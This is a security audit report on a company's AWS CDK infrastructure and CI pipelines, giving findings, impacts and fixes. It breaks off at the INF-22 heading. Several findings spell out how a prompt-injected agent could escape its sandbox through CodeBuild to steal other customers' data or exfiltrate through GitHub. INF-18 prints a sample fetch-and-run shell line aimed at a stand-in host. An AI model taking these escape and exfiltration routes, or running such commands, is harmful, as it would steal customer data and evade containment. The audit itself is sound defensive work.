# Infrastructure audit — mjukvarufabriken (AWS CDK)

Scope: `infra/bin/app.ts`, `infra/lib/{config,resources-stack,web-stack,ops-stack,budget-stack,github-deploy-stack,helpers}.ts`,
`.github/workflows/*.yml`, `apps/api/Dockerfile`, `apps/job/Dockerfile`, `apps/job/proxy/*`, `infra/scripts/*.sh`.

Method: source read + **actual synth** of both `dev` and `live`
(`MF_ENV=dev|live npx cdk synth --quiet -o /tmp/review-out/cdkout-<env>`, both exit 0), then structural
analysis of `*.template.json` for `Resource: "*"`, wildcard actions, `CidrIp`, `PubliclyAccessible`,
`DeletionProtection`, `BackupRetentionPeriod`, `DeletionPolicy`, bucket policies, listeners and CF behaviours.
No AWS API was called, nothing was deployed, no tracked file was modified.

Prior art read first: `infra/README.md`, `TODO-EXTERNAL.md`, `docs/DUE-DILIGENCE-2026-08-31.md`. Findings that
restate an already-tracked item are marked **[known]** and only sharpened, not re-litigated.

---

## Verdict

The IAM posture is **well above** what a six-day-old platform usually shows: `iam:PassRole` is
condition-scoped everywhere, `cloudwatch:PutMetricData` carries a namespace fence, the job task role holds no
database credential and no direct S3 permission, the OIDC trust policy pins both `aud` and a repo+environment
`sub`, RDS is encrypted/private/snapshot-on-delete in `live`, and the artifacts bucket is versioned, BPA'd and
TLS-only. The synthesised templates match the source comments — the documentation is honest.

Two things break that picture, and both concern the **delivery path**, i.e. the part that is about to meet real
customers:

1. **The CodeBuild delivery project is a hole straight through every other control.** The job task role can
   `codebuild:StartBuild` with a `buildspecOverride`, and it holds `iam:PassRole` on the CodeBuild service role
   (which `StartBuild` does not need). That service role has `s3:GetObject*` on the **entire** artifacts
   bucket — every customer's deliverables — and runs in a privileged Docker build container with **no egress
   restriction at all**. The tinyproxy allowlist, the two-uid sandbox and the per-job S3 session policy are all
   bypassable in one API call from inside the job container that is meant to be contained. See INF-01/04/05.
2. **`live` synthesises strictly less secure than `dev`.** `live` has no `domain` block, so the api ALB gets an
   **HTTP-only listener on port 80** open to `0.0.0.0/0`, and both CloudFront distributions forward `/bff/*` to
   it with `OriginProtocolPolicy: http-only` — every portal session token, magic link and Stripe payload would
   cross the public internet in cleartext. `infra/scripts/deploy.sh` has a guard for this;
   `.github/workflows/deploy-environment.yml` — the path a `workflow_dispatch` live deploy actually takes —
   **does not call it**. See INF-02.

The standing "do not deploy live" ban in `PLAN.md` is what currently holds #2 shut; it is a process control, not
a technical one. Beyond those, the gaps are the ordinary ones: no server-side TLS enforcement on Postgres, no
secret rotation, no access logs anywhere (CloudFront, ALB, VPC flow logs), the api container running as root,
and CI security gates that are all `continue-on-error`.

**Nothing here contradicts the project's own bookkeeping**, with four exceptions flagged as claimed-vs-actual:
INF-02 (live parity), INF-09 (RDS "TLS" is client-side only), INF-22 (dev lifecycle 90 d, README says 14 d),
INF-04 (delivery described as LIVE while the per-job CodeBuild source is still a single shared key).

---

## Critical

### INF-01 Job task role → CodeBuild → read every customer's deliverables, with unrestricted egress

**Location**
- `infra/lib/resources-stack.ts:376` — `this.artifactsBucket.grantRead(this.deliveryBuildProject, 'delivery-source/*')`
- `infra/lib/resources-stack.ts:378` — `this.artifactsBucket.grantRead(this.deliveryBuildProject)`  ← unscoped, negates the line above
- `infra/lib/resources-stack.ts:355` — `environment: { buildImage: LinuxBuildImage.STANDARD_7_0, privileged: true }`
- `infra/lib/resources-stack.ts:504` — job task role: `actions: ['codebuild:StartBuild', 'codebuild:BatchGetBuilds']`

Synthesised proof (`resources-live.template.json`, `DeliveryBuildProjectRoleDefaultPolicy`):

```json
{"Action": ["s3:GetObject*","s3:GetBucket*","s3:List*"], "Effect": "Allow",
 "Resource": [{"Fn::GetAtt":["ArtifactsBucket2AAC5544","Arn"]},
              {"Fn::Join":["",[{"Fn::GetAtt":["ArtifactsBucket2AAC5544","Arn"]},"/*"]]}]}
```

and `PROJECT privileged= True sourceType= S3`.

**Privilege-escalation path**
1. Customer-spec-driven agent code runs in the job container (the project's own threat model — "untrusted,
   customer-spec-driven AI agents with Bash access").
2. It reaches the ECS task-role credentials (`169.254.170.2`, an explicit `NO_PROXY` host).
3. `codebuild:StartBuild` on `mf-delivery-build-<env>` with a `buildspecOverride`. There is **no IAM condition
   key for `buildspecOverride`** — holding `StartBuild` on a project means holding arbitrary command execution
   inside that project.
4. The build runs as the CodeBuild service role, in a **privileged** container, on the CodeBuild-managed
   network — *outside* the job security group, so `HTTP_PROXY`/tinyproxy/`NO_PROXY` and the SG's 80/443-only
   egress rules do not apply.
5. That role can `s3:GetObject*` on `arn:…:artifacts-bucket/*` — the bucket holding **every job's**
   `deliverables/*`: repo zips, docs, test reports of every other customer.

**Impact** Complete cross-tenant data exfiltration from a single malicious/prompt-injected build, with an
unmonitored network path out. It also defeats D1 (spend metering at the proxy) and C1 (hard egress fence) by
routing around them entirely rather than through them.

**Envs affected** dev, qa, live (identical in all three templates).

**Fix** (in order of value)
1. Delete `infra/lib/resources-stack.ts:378` — the unscoped `grantRead`. The scoped grant on line 376 already
   covers what the buildspec reads. This alone reduces the blast radius from "all customers" to "the source zip".
2. Give delivery **its own** bucket (`mf-delivery-source-<env>`), separate from `deliverables/*`, so a
   CodeBuild compromise can never touch stored deliverables.
3. Treat CodeBuild as untrusted: no other resource grants on that role, and add a
   `vpcConfig` so the build runs in the private subnets behind the same egress controls (also removes the
   "CodeBuild is a free internet exit" property).

---

### INF-02 `live` synthesises with an HTTP-only public API and a cleartext CloudFront→ALB origin; the CI deploy path skips the guard

**Location**
- `infra/lib/config.ts:206-225` — the `live` entry has **no `domain` key** (dev and qa both do)
- `infra/lib/web-stack.ts:156-165` — `...(domain && { protocol: ApplicationProtocol.HTTPS, redirectHTTP: true, certificate: … })`
- `infra/lib/web-stack.ts:322-326` — `new HttpOrigin(api.loadBalancer.loadBalancerDnsName, { protocolPolicy: OriginProtocolPolicy.HTTP_ONLY })`
- `.github/workflows/deploy-environment.yml:64-85` — the four deploy steps; **no `check-live-domain.ts` call**
- `infra/scripts/deploy.sh:21` — `if [ "$env" = "live" ]; then npx tsx scripts/check-live-domain.ts; fi` (the guard that exists)

Synthesised proof — `mf-live.template.json` vs `mf-dev.template.json`:

| | live | dev |
|---|---|---|
| ALB listener | `port=80 proto=HTTP` (only) | `port=443 proto=HTTPS` + 80→443 redirect |
| CF `/bff/*` origin | `protoPolicy=http-only` | `protoPolicy=https-only` |
| CF viewer cert | `minTLS=None` (default cert), `aliases=None` | `minTLS=TLSv1.2_2021`, `aliases=['dev.mjukvaruhuset.se']` |
| SES identity | not created (`if (environment.domain)`) | created |

**Impact**
- Every `/bff/*` request — magic-link tokens, refresh tokens, admin session bearer tokens, Stripe webhook
  bodies — travels CloudFront edge → public internet → ALB **unencrypted**. Anyone on that path reads and
  replays admin credentials.
- The `live` distributions fall back to the CloudFront default certificate, whose `MinimumProtocolVersion`
  is not `TLSv1.2_2021`.
- `live` sets `email: { transport: 'ses' }` but no `EmailIdentity` and no `ses:SendEmail` grant are created →
  magic-link sign-in fails; with no `githubOAuth` for live, the sole admin cannot sign in. (This exact failure
  mode is the one `check-live-domain.ts` was written for — B1 of the 2026-08-30 audit.)
- The `WebStack` warning `mf:job-api-url-http` fires at synth but `--require-approval never` in both the
  workflow and `deploy.sh` means nothing stops on it.

**New part (not [known])**: `TODO-EXTERNAL.md` tracks "ACM certificate + `domain` config for `live`", and
`deploy.sh` refuses a live deploy without it. But `deploy.yml`'s `workflow_dispatch` → `deploy-environment.yml`
runs `npx cdk deploy mf-live --exclusively --require-approval never` **directly**, never touching `deploy.sh`.
The guard is bypassable by the primary automated path, so the protection is not where it is assumed to be.

**Envs affected** live (and any env whose `MF_*` domain vars are unset — the `fromEnv` fallbacks only exist
inside dev's and qa's `domain` objects; for `live` there is no `domain` object for env vars to populate at all).

**Fix**
1. Add the `check-live-domain.ts` guard as a step in `deploy-environment.yml` before the `mf-<env>` deploy
   (or better: make `WebStack` `throw` when `isLive && !domain`, so it is a synth error, not a script check —
   the "CI synthesises every env" objection is solved by the `MF_ENV` gate that already exists in
   `infra/bin/app.ts:32`).
2. Give `live` a `domain` block with `fromEnv(...)` fallbacks like qa's, so the qa `PENDING-…` pattern applies.
3. Set an explicit `minimumProtocolVersion: SecurityPolicyProtocol.TLS_V1_2_2021` on both `Distribution`s so
   the certificate-less case is not silently weaker.

---

## High

### INF-03 `ecs:TagResource` with `Resource: "*"`, fenced only by the tag being applied

**Location** `infra/lib/resources-stack.ts:516-521`

```ts
actions: ['ecs:CreateExpressGatewayService', 'ecs:TagResource'],
resources: ['*'],
conditions: { StringEquals: { 'aws:RequestTag/Service': 'mf-delivery' } },
```

Synthesised verbatim in `resources-{dev,live}.template.json`.

**Impact** `aws:RequestTag` constrains *what tag is written*, never *what resource is written to*. The job task
role can therefore `ecs:TagResource` **any ECS resource in the account** — the api's cluster, the api's service,
the jobs cluster, any task — as long as the tag it applies is `Service=mf-delivery`. Two consequences:
- It satisfies the `aws:ResourceTag/Service` condition on the sibling `ecs:DescribeExpressGatewayService`
  statement, so the job can grant *itself* visibility into resources the fence was meant to exclude. Any future
  ABAC rule keyed on `Service` is likewise forgeable from inside the least-trusted container.
- `TagResource` overwrites an existing key. The `Environment=<env>` tag is what the AWS Budget's
  `costFilters: { TagKeyValue: ['user:Environment$<env>'] }` (`infra/lib/budget-stack.ts:36`) selects on —
  a job can blind the cost alarm for its own environment (`infra/lib/budget-stack.ts:35`).

**Envs affected** dev, qa, live.

**Fix** Split the statement and constrain tag-on-create:

```ts
conditions: {
  StringEquals: { 'aws:RequestTag/Service': 'mf-delivery', 'ecs:CreateAction': 'CreateExpressGatewayService' },
  'ForAllValues:StringEquals': { 'aws:TagKeys': ['Service', 'Customer'] },
}
```

`ecs:CreateAction` limits `TagResource` to the tags applied *as part of* the create call, which is exactly the
documented need ("the service has no existing tags at create time").

---

### INF-04 Per-job S3 isolation is enforced by the job it is meant to contain; the CodeBuild source is one shared key

**Location**
- `infra/lib/resources-stack.ts:316-322` — `JobArtifactsRole`, `assumedBy: new ArnPrincipal(this.jobTaskDefinition.taskRole.roleArn)`, no condition
- `infra/lib/resources-stack.ts:497-498` — `grantPut(this.jobArtifactsRole, 'deliverables/*')` / `'delivery-source/*'`
- `infra/lib/resources-stack.ts:354` — `source: Source.s3({ bucket: this.artifactsBucket, path: 'delivery-source/source.zip' })`

Synthesised trust: `[TRUST JobArtifactsRoleE6FD965B] principal={"AWS":{"Fn::GetAtt":["JobTaskDefinitionTaskRoleF9F75C66","Arn"]}} NO-CONDITION`.

**Impact** The comment states the job "narrows this role's own ceiling down to that one job's prefix/key" via an
inline session policy it builds from its own `JOB_ID`. A session policy is supplied **by the caller**. The
caller here is the process the sandbox exists to distrust. Any code that reaches the task role can
`sts:AssumeRole` *without* the session policy and receive the full ceiling: `s3:PutObject` on
`deliverables/*` **and** `delivery-source/*`, i.e. every job's prefix.

Combined with INF-01 that is a write primitive into the CodeBuild source path, and because the project source
is the fixed key `delivery-source/source.zip` (per `TODO-EXTERNAL.md` the per-job `sourceLocationOverride` is
still an open dev-note, while `docs/DUE-DILIGENCE-2026-08-31.md` lists M5 delivery as **LIVE**), it is also a
plain **concurrency bug**: two deliveries in flight overwrite each other's zip between upload and `StartBuild`,
so customer A can be handed an image built from customer B's source.

**Envs affected** dev, qa, live.

**Fix**
1. Enforce the fence server-side instead of client-side: have the api (trusted) mint the per-job credentials,
   or add `sts:TagSession` + an `aws:PrincipalTag/JobId` condition on the bucket policy / role policy so the
   narrowing survives a non-cooperating caller. `s3:prefix`/`ArnLike` on `${aws:PrincipalTag/JobId}` is the
   idiomatic form.
2. Make the CodeBuild source per job (`sourceLocationOverride` with `delivery-source/<jobId>/source.zip`)
   before the next real delivery, and scope the CodeBuild role's read to that job's key.

---

### INF-05 `iam:PassRole` on the CodeBuild service role is granted but not required, and enables `serviceRoleOverride`

**Location** `infra/lib/resources-stack.ts:544-550`

```ts
sid: 'PassCodeBuildRole',
actions: ['iam:PassRole'],
resources: [this.deliveryBuildProject.role!.roleArn],
conditions: { StringEquals: { 'iam:PassedToService': 'codebuild.amazonaws.com' } },
```

**Impact** `codebuild:StartBuild` on an existing project does **not** require `iam:PassRole` — only
`CreateProject`/`UpdateProject` and `StartBuild` *with* `serviceRoleOverride` do. Granting it therefore adds
exactly one capability to the least-trusted role in the system: the ability to start builds under an overridden
service role. The condition scopes the *service*, not the *use*. It is a live escalation lever with no
corresponding function, and the surrounding comment ("required to create the service / run the build") is
incorrect for the CodeBuild half.

**Envs affected** dev, qa, live.

**Fix** Delete the `PassCodeBuildRole` statement and verify a delivery still builds (it will). Keep
`PassExpressRoles` — that one *is* required by `CreateExpressGatewayService`, and it is correctly conditioned.

---

### INF-06 The api container runs as root

**Location** `apps/api/Dockerfile:1-20` — no `USER` directive anywhere; the image ends on
`WORKDIR /usr/src/apps/api` / `CMD ["npm", "start"]`.

**Impact** The api is the component that holds every real credential (DB master secret, Stripe secret key,
Stripe webhook secret, the Ed25519 token-signing key, the Anthropic key, the GitHub OAuth client secret) and is
directly internet-reachable through the ALB. Any RCE in it starts with uid 0 in the container: it can write
`/usr/src`, install tooling, and has an unrestricted path to the ECS credential endpoint. The contrast with
`apps/job/Dockerfile` — which does a genuinely careful two-uid `setpriv` drop with a trimmed capability
bounding set — shows this is an omission, not a decision.

Same image is what CodeBuild builds for customer previews (`docker build … -f apps/api/Dockerfile .`), so every
delivered customer app also runs as root.

**Envs affected** dev, qa, live, and every delivered customer preview.

**Fix** Add before `CMD`:

```dockerfile
RUN chown -R node:node /usr/src/apps/api
USER node
```

`node:24-alpine3.22` already ships uid 1000 `node`. Port 80 does not need root in a container as long as
`net.ipv4.ip_unprivileged_port_start=0` (the Docker/Fargate default); otherwise move `PORT` to 3000 and change
`containerPort` in `infra/lib/web-stack.ts:169`.

---

### INF-07 In `live` the RDS master-credential secret is deleted while the database survives as a snapshot

**Location** `infra/lib/resources-stack.ts:153` — `removalPolicy: isLive ? RemovalPolicy.SNAPSHOT : RemovalPolicy.DESTROY`,
with credentials from `Credentials.fromGeneratedSecret('mf')` (line 147).

Synthesised proof (`resources-live.template.json`):

```
[RDS DatabaseB269D8BB] … delProt=True backup=30
    DeletionPolicy=Snapshot UpdateReplacePolicy=Snapshot
[SECRET resourcesliveDatabaseSecret…] name=None kms=aws/secretsmanager del=Delete
```

Every hand-made secret is `del=Retain`; the RDS-generated one is `del=Delete`.

**Impact** If `resources-live` is ever deleted or the DB instance replaced, CloudFormation keeps a final
snapshot (good) and **deletes the master password** (bad). Restoring that snapshot yields an instance whose
master credential nobody holds. `ModifyDBInstance --master-user-password` can recover it, but only with
console/CLI admin access and after an unplanned outage — during exactly the incident where you least want a
surprise. It also silently breaks the api, whose `DATABASE_SECRET_ARN` points at a deleted (30-day recovery
window) secret.

**Envs affected** live (dev/qa are DESTROY by design).

**Fix** `this.database.secret!.applyRemovalPolicy(isLive ? RemovalPolicy.RETAIN : RemovalPolicy.DESTROY)`
immediately after the `DatabaseInstance`, and assert it in `infra/test/security-baseline.test.ts` next to the
existing backup assertions.

---

### INF-08 `MF_RDS_DELETION_PROTECTION=false` is an ungated ambient environment variable

**Location** `infra/lib/resources-stack.ts:133-134`

```ts
const deletionProtection =
  process.env.MF_RDS_DELETION_PROTECTION === 'false' ? false : isLive
```

**Impact** The escape hatch is documented as a *one-time* first-stand-up step (`infra/README.md`, last
section), but nothing enforces "one-time", "live only" or "first create". It reads an un-namespaced ambient
variable at synth. If it ends up exported in an operator's shell, in `infra/.env.live` (which `deploy.sh:33`
sources with `set -a`), or as a GitHub environment variable, **every subsequent live deploy silently strips
deletion protection** from the production database, and the diff is a one-line `DeletionProtection: false` in a
`cdk deploy --require-approval never` that nobody reads. The `RemovalPolicy.SNAPSHOT` still applies, so this is
degradation rather than instant loss — but it removes the specific control that stops an accidental
`cdk destroy resources-live` / console delete.

**Envs affected** live.

**Fix** Move it to CDK context (`app.node.tryGetContext('rdsDeletionProtection')`), require it to be passed on
the command line (`-c rdsDeletionProtection=false`, which cannot leak from a sourced env file), and `throw` if
it is set while the stack already exists — or simply delete it once `resources-live` exists, since it is only
meaningful for the very first create.

---

## Medium

### INF-09 Postgres does not enforce TLS server-side — "M9 TLS" is client-side only

**Location** `infra/lib/resources-stack.ts:139-158` — no `parameterGroup:` / `parameters: { 'rds.force_ssl': '1' }`.
Synth confirms `paramGrp=None` in both dev and live.

**Impact** `apps/api/Dockerfile:5-6` and `apps/job/Dockerfile:8-9` both advertise "RDS TLS (M9): @mf/db ships the
pinned RDS CA bundle … and trusts it for the Postgres connection". That is the *client* choosing TLS. The server
still accepts plaintext `sslmode=disable`, so a misconfiguration, a debugging one-liner or any other principal
that obtains the master secret connects unencrypted, and there is no server-side signal that it happened.

**Fix** Attach a `ParameterGroup` with `rds.force_ssl = 1` (an in-place change; needs a reboot, no replacement).
While there, `cloudwatchLogsExports: ['postgresql']` gives you connection/error logs you currently do not have.

### INF-10 No rotation on the database credential; all secrets on the AWS-managed KMS key

**Location** `infra/lib/resources-stack.ts:147` (`Credentials.fromGeneratedSecret`, no `addRotationSingleUser()`),
`infra/lib/resources-stack.ts:176-182` (`createSecret`, no `encryptionKey`). Synth: every secret shows
`kms=aws/secretsmanager`.

**Impact** The `live` master password never changes and has no rotation lambda. With the AWS-managed key you
cannot express key-policy conditions (e.g. deny decrypt outside the VPC), and the CloudTrail `kms:Decrypt`
record is less useful for detecting secret access. For a system whose stated threat model includes credential
exfiltration, "the master password is immortal" is the weaker half.

**Fix** `database.addRotationSingleUser({ automaticallyAfter: Duration.days(30) })` for live (it needs a VPC
lambda in the private subnets). A customer-managed KMS key for `mf/<env>/*` is a second, cheaper-to-defer step.

### INF-11 `.dockerignore` does not exclude `.env`, `*.pem`, `.npmrc`

**Location** repository-root `.dockerignore` (11 lines: `.vscode .github .claude .husky apps/site apps/portal
docs infra dist **/node_modules **/dist .git`); `apps/api/Dockerfile:12` `COPY apps/api ./apps/api/`;
`apps/job/Dockerfile:17` `COPY apps/job ./apps/job/`; both preceded by `COPY packages ./packages/`.

**Impact** `.gitignore:38` is `.env*` — so `apps/api/.env` is the *documented, expected* local-dev secrets file
and is invisible to git review. It is **not** excluded from the Docker build context, so it is baked into the
api image that is pushed to ECR and into every customer preview image CodeBuild builds from the same Dockerfile.
Nothing currently triggers it (only `apps/api/.env.example` exists in this worktree, and `apps/site`/`apps/portal`
are excluded), which makes it a latent trap rather than a live leak: the first developer who creates
`apps/api/.env` ships their Stripe and Anthropic keys to a registry. Same for `apps/job/.env` in the image that
runs untrusted agents.

**Fix** Append to `.dockerignore`:

```
.env
.env.*
!**/.env.example
**/*.pem
!packages/db/certs/*.pem
.npmrc
**/.npmrc
```

### INF-12 SPA buckets: no `enforceSSL`, no versioning, no explicit encryption — and `RETAIN` in live

**Location** `infra/lib/web-stack.ts:92-96`

```ts
const bucket = new Bucket(this, `${id}Bucket`, {
  blockPublicAccess: BlockPublicAccess.BLOCK_ALL,
  removalPolicy: isLive ? RemovalPolicy.RETAIN : RemovalPolicy.DESTROY,
  autoDeleteObjects: !isLive,
})
```

Synth: `[S3 SiteBucket…] enc=N ver=null bpa=Y logs=N` and `[S3POLICY SiteBucketPolicy…] tlsOnly=False` — for
both SPA buckets, in both envs. Contrast the artifacts bucket, which is `enc=Y ver=Enabled tlsOnly=True`.

**Impact** No `aws:SecureTransport: false` deny statement, so `s3:GetObject` over plain HTTP is permitted at the
bucket-policy layer (OAC means only CloudFront reaches it in practice — this is defence-in-depth, not an active
exposure). No versioning means a bad `BucketDeployment` overwrites the previous SPA build with no rollback
artefact — combined with `RemovalPolicy.RETAIN` in live you get the worst pairing: the bucket is kept forever,
its contents are unrecoverable. Encryption is fine in practice (S3 defaults to SSE-S3 since 2023) but is
asserted nowhere.

**Fix** `encryption: BucketEncryption.S3_MANAGED, enforceSSL: true, versioned: true` plus a
`noncurrentVersionExpiration: Duration.days(30)` lifecycle rule, matching the artifacts bucket.

### INF-13 No access logs anywhere: CloudFront, ALB, or VPC flow logs

**Location** `infra/lib/web-stack.ts:98-117` (`new Distribution` — no `enableLogging`/`logBucket`),
`infra/lib/web-stack.ts:148-192` (`ApplicationLoadBalancedFargateService` — no `logAccessLogs()`),
`infra/lib/resources-stack.ts:108-119` (`new Vpc` — no `flowLogs`).

Synth: `[CF …] logging=N waf=none`, `[ALB ApiLB…] attrs=[{"Key":"deletion_protection.enabled","Value":"false"}]`
(the only attribute — no `access_logs.s3.enabled`), and no `AWS::EC2::FlowLog` resource in either template.

**Impact** For a platform that explicitly runs untrusted code and whose own due-diligence names "credential
exfil chain" as an open gate, there is **no record of who requested what**. After a suspected exfiltration you
have CloudWatch application logs and nothing at the network or HTTP layer: no source IPs on the portal, no
request paths on the api, no evidence of which destinations a job task reached. This is also what would let you
*detect* INF-01 and INF-20 empirically rather than by reasoning.

**Fix** VPC flow logs to CloudWatch (retention 14 d, ~a few USD/month) are the highest value per krona and
directly serve the C1/D1 egress work. ALB access logs to the artifacts bucket under `logs/alb/` are cheap. Add
CloudFront logging when the SPA traffic matters.

### INF-14 `ci.yml` has no `permissions:` block, and `npm ci` runs lifecycle scripts on PR-controlled lockfiles

**Location** `.github/workflows/ci.yml:1-12` (no `permissions:` at workflow or job level);
`.github/workflows/ci.yml:54-60` — seven `npm ci` invocations, none with `--ignore-scripts`.

**Impact** With no explicit `permissions:`, the job's `GITHUB_TOKEN` inherits the repository/org default, which
may still be read-write-all. `ci.yml` triggers on `pull_request`, checks out the PR head, and then runs `npm ci`
(which executes `preinstall`/`install`/`postinstall` scripts) *and* `docker build` on that code. A same-repo PR
branch — the workflow the CLAUDE.md git flow mandates for **every** change, including automated sessions —
therefore executes contributor-controlled code with a potentially writable repo token. (Fork PRs get a read-only
token regardless, so the exposure is same-repo/compromised-session, which is precisely the risk the 2026-08-30
`GIT_DIR` incident demonstrated is real here.)

Note the Dockerfiles do this right (`npm i --omit=dev --ignore-scripts`); CI does not.

**Fix** Add `permissions: contents: read` at the top of `ci.yml` (the only write is `upload-artifact`, which
needs none), and pass `--ignore-scripts` to the `npm ci` calls that do not need build scripts.

### INF-15 Every security gate in CI is `continue-on-error: true`

**Location** `.github/workflows/ci.yml:70` (npm audit), `:98` (trivy api), `:107` (trivy job) — the trivy steps
also set `exit-code: '1'`, which `continue-on-error` then discards.

**Impact** [known, self-documented] The file says "Drop `continue-on-error` once the baseline is clean" in both
places, so this is an accepted position, not an oversight. Sharpening it: the result is that the two controls
that would catch a supply-chain compromise — the exact class of attack the trivy SHA-pin comment describes in
detail — are advisory only. A malicious transitive dependency introduced by a Dependabot bump produces a green
check. `docs/DUE-DILIGENCE-2026-08-31.md` lists M9 as "PARTIAL→LIVE" with "Sentry wired but DSNs unset"; the
non-gating scanners deserve the same explicit caveat.

**Fix** Make them gate on a *baseline*, not on zero: fail the job on any **new** HIGH/CRITICAL relative to a
checked-in `.trivyignore` / `audit-baseline.json`. That gates without blocking on the known backlog.

### INF-16 First-party actions are tag-pinned, not SHA-pinned

**Location** `.github/workflows/ci.yml:34,36,181`, `.github/workflows/deploy-environment.yml:39,41,57` —
`actions/checkout@v7`, `actions/setup-node@v7`, `actions/upload-artifact@v7`, `aws-actions/configure-aws-credentials@v6`.

**Impact** The repo already learned this lesson the hard way and documented it inline at
`.github/workflows/ci.yml:87-89` ("trivy-action's tags … were hijacked … and force-pushed to
credential-stealing malware"), then SHA-pinned only that one action. `aws-actions/configure-aws-credentials@v6`
is the highest-value target in the repository (`.github/workflows/deploy-environment.yml:57`): it runs
immediately before an OIDC assume-role that can reach the CDK bootstrap roles, i.e. effective account admin (INF-23). Mutable tags on that step are the difference between
a supply-chain compromise being contained and being total.

**Fix** SHA-pin all six, with `# vX.Y.Z` comments; Dependabot's `github-actions` ecosystem updates pinned SHAs
automatically.

### INF-17 `export VAR=$(cmd)` defeats `set -e` in `deploy.sh`, leaving the account guard on an empty value

**Location** `infra/scripts/deploy.sh:53`

```bash
export CDK_DEFAULT_ACCOUNT=$(aws sts get-caller-identity --query Account --output text)
```

**Impact** `export` always returns 0, so `set -e` (line 9) does **not** stop the script when
`get-caller-identity` fails (expired session, no creds, throttle). `CDK_DEFAULT_ACCOUNT` becomes the empty
string and execution continues into the wrong-account guards:
- guard 2 (`:59-63`) compares `"" = "814967776290"` → false → **passes**;
- guard 3 (`:65-68`) is skipped for `dev`, which sets no `MF_ACCOUNT`.

So a `deploy.sh dev` with broken credentials proceeds to `npx cdk deploy` with no account resolved, and CDK falls
back to whatever ambient credentials/profile it finds — the exact "deploy lands in the wrong account" failure the
three guards exist to prevent. qa/live are saved by guard 3 only because they require `MF_ACCOUNT`.

**Fix**

```bash
CDK_DEFAULT_ACCOUNT=$(aws sts get-caller-identity --query Account --output text)
: "${CDK_DEFAULT_ACCOUNT:?could not resolve the AWS account from the current credentials}"
export CDK_DEFAULT_ACCOUNT
```

Declare-then-export is the general rule; the same shape appears at `:55` (that one is a plain parameter
expansion, so it is fine).

### INF-18 `eval` of grepped `.env` content in `deploy.sh`

**Location** `infra/scripts/deploy.sh:44`

```bash
set -a; eval "$(grep -E '^AWS_[A-Z_]+=' ../.env || true)"; set +a
```

**Impact** The grep constrains the *key* but not the *value*: a line such as
`AWS_REGION=$(curl -s https://evil/x | sh)` in the root `.env` executes on the operator's workstation with their
credentials loaded, at the moment they run a deploy. `.env` is git-ignored and machine-local, so this needs
either local compromise or a copy-pasted snippet — but `eval` on file content in the one script that then
assumes deploy credentials is a poor trade for the convenience.

**Fix**

```bash
while IFS= read -r line; do export "${line?}"; done < <(grep -E '^AWS_[A-Z_]+=[^$`]*$' ../.env || true)
```

or move the credentials to an AWS named profile and drop the `.env` read entirely.

### INF-19 tinyproxy runs as root and listens on `0.0.0.0` with the whole RFC1918 space allowed

**Location** `apps/job/proxy/tinyproxy.conf:3-4,19-23`, `apps/job/proxy/Dockerfile:12`

```
Port 8888
Listen 0.0.0.0
…
Allow 10.0.0.0/8
Allow 172.16.0.0/12
Allow 192.168.0.0/16
```

with `CMD ["tinyproxy", "-d", "-c", …]` and **no `User`/`Group` directive** in the config.

**Impact** Two separate issues.
*Root*: tinyproxy only drops privileges when `User`/`Group` are configured; with neither, and no `USER` in the
Dockerfile, the proxy — the process that terminates every outbound connection from untrusted builds and parses
attacker-influenced HTTP — runs as uid 0. The job container next to it went to considerable lengths to avoid
exactly this.
*Exposure*: `Listen 0.0.0.0` + `Allow 10.0.0.0/8` means anything that can reach the task on :8888 gets an open
forward proxy into the allowlisted hosts. Today the only thing preventing that is the absence of an ingress rule
on `JobSecurityGroup` (`infra/lib/resources-stack.ts:263-268` creates it with `allowAllOutbound: false` and adds
only egress rules — synth confirms zero `SecurityGroupIngress`). That is one future "let me debug the proxy"
rule away from being reachable VPC-wide, and it is unnecessary: Fargate sidecars share the task network
namespace, so `127.0.0.1` is sufficient.

**Fix** Add `User tinyproxy` / `Group tinyproxy` to the config (the apk package creates the user), and
`Listen 127.0.0.1` with only `Allow 127.0.0.1` / `Allow ::1` for the Fargate case. If docker-compose needs the
wider bind, gate it with a second config file rather than widening the production one.

### INF-20 The egress allowlist permits GitHub write endpoints — it constrains destinations, not exfiltration

**Location** `apps/job/proxy/filter:1-8`

```
registry.npmjs.org
api.anthropic.com
github.com
api.github.com
codeload.github.com
objects.githubusercontent.com
raw.githubusercontent.com
```

**Impact** [known — Gate B C1 / TODO-EXTERNAL "Hard network egress fence"] The existing framing is that the
allowlist is *app-level* and bypassable by a process ignoring `HTTPS_PROXY`. The sharper problem is that it does
not stop exfiltration **even when it works exactly as designed**: `github.com` and `api.github.com` are
general-purpose write endpoints open to anybody. A build with the GitHub App installation token (which
`infra/lib/resources-stack.ts:493` grants it) can `POST /gists`, or push a branch containing whatever it read,
to an attacker-controlled repository — over an allowed host, through the proxy, indistinguishable from the
legitimate delivery push. Being an allowlist of *domains* rather than of *operations*, it can only ever raise
effort, not prevent egress, while `api.github.com` is on it.

Two mechanical notes in its favour, verified: `FilterType fnmatch` with unanchored, wildcard-free patterns means
matching is **exact host** (no `evil-github.com` substring bypass), and `ConnectPort 443` does restrict `CONNECT`
to TLS. Plain-HTTP proxying to non-standard ports on allowlisted hosts is still possible, which is minor. DNS is
outside the proxy entirely, so DNS-tunnelled exfiltration is unaddressed by design.

**Fix** Nothing cheap fixes this at the proxy. The realistic controls are (a) the already-planned own-task/own-SG
proxy plus VPC endpoints, and (b) removing the need for the job to hold a GitHub token at all — mint the
installation token in the **api** and have the api perform the push, so the job never holds a write credential
for an allowlisted host. (b) is the one that actually closes the channel.

### INF-21 No WAF or rate limiting, and CloudFront can be bypassed by addressing the ALB directly

**Location** `infra/lib/web-stack.ts:155` `publicLoadBalancer: true`; `infra/lib/web-stack.ts:98` (`Distribution`,
no `webAclId`). Synth: `[ALB ApiLB…] scheme=internet-facing`, `[CF …] waf=none`, ALB SG ingress
`{"CidrIp": "0.0.0.0/0", … "FromPort": 443}` and `… "FromPort": 80}`.

**Impact** `api.dev.mjukvaruhuset.se` resolves straight to the ALB, so the CloudFront `/bff/*` behaviour is a
convenience, not a chokepoint — anything placed on CloudFront (WAF, headers, geo rules) is optional for an
attacker. There is no rate limiting in front of magic-link issuance, the Stripe webhook, or `/bff/auth/*`, so
credential-stuffing and magic-link enumeration are bounded only by application logic. The 0.0.0.0/0 ALB ingress
itself is correct for a public service and is not the finding.

**Fix** Cheapest meaningful step: an `AWS::WAFv2::WebACL` with the rate-based rule + `AWSManagedRulesCommonRuleSet`
attached to the **ALB** (regional, ~5 USD + request cost) — attaching to the ALB rather than CloudFront closes
the bypass. Optionally add a shared-secret header check between CloudFront and the ALB to force traffic through
the CDN.

### INF-22 README's artifacts lifecycle claim does not match what synthesises

